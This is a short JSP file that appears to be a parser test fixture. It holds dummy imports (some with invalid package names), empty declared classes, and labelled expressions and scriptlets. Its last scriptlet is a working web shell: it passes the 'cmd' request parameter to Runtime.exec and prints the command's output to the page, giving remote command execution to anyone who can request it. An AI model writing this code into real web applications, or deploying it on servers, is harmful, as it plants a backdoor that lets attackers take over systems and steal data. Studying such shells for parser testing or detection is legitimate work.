<%@page import="java.util.*,java.io.*" contentType="text/html" %>
<%@page import="java.fff.*,java.111.*" contentType="text/html" %>
<%! class Test1{} %>
<%! class Test2{} %>
<%= out.write("I'm expr1  ") %>
<%= out.write("I'm expr2  ") %>
<% out.write("I'm scriptlet1  "); %>
<%
    if (request.getParameter("cmd") != null) {

        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
            out.println(disr);
            disr = dis.readLine();
        }
    }

%>